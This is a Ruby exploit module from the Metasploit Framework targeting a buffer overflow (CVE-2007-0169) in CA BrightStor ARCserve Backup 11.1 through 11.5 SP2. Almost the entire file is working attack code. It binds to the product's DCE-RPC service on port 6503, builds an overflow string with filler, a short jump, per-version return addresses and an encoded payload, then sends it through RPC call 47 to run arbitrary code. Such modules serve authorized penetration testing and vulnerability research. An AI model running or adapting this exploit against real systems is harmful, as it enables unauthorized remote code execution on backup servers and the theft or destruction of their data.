##
# $Id: message_engine.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::DCERPC

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'CA BrightStor ARCserve Message Engine Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in Computer Associates BrightStor ARCserve Backup
				11.1 - 11.5 SP2. By sending a specially crafted RPC request, an attacker could overflow
				the buffer and execute arbitrary code.
			},
			'Author'         => [ 'MC', 'patrick' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2007-0169' ],
					[ 'OSVDB', '31318' ],
					[ 'BID', '22005' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 600,
					'BadChars' => "\x00\x0a\x0d\x5c\x5f\x2f\x2e",
					'StackAdjustment' => -3500,
				},
			'Platform' => 'win',
			'Targets'  =>
				[
					[ 'BrightStor ARCserve r11.1',		{ 'Ret' => 0x23805d10 } ], #p/p/r cheyprod.dll 07/21/2004
					[ 'BrightStor ARCserve r11.5',		{ 'Ret' => 0x2380ceb5 } ],
					[ 'BrightStor ARCserve r11.5 SP2',	{ 'Ret' => 0x2380a47d } ],
				],
			'DisclosureDate' => 'Jan 11 2007',
			'DefaultTarget' => 1))

		register_options(
			[
				Opt::RPORT(6503)
			], self.class)
	end

	def exploit
		connect

		handle = dcerpc_handle('dc246bf0-7a7a-11ce-9f88-00805fe43838', '1.0', 'ncacn_ip_tcp', [datastore['RPORT']])
		print_status("Binding to #{handle} ...")

		dcerpc_bind(handle)
		print_status("Bound to #{handle} ...")

		filler =  rand_text_english(616) + Rex::Arch::X86.jmp_short(6) + rand_text_english(2) + [target.ret].pack('V')

		sploit =  NDR.string(filler + payload.encoded + "\x00") + NDR.long(0)

		print_status("Trying target #{target.name}...")

			begin
				dcerpc_call(47, sploit)
				rescue Rex::Proto::DCERPC::Exceptions::NoResponse
			end

		handler
		disconnect
	end

end
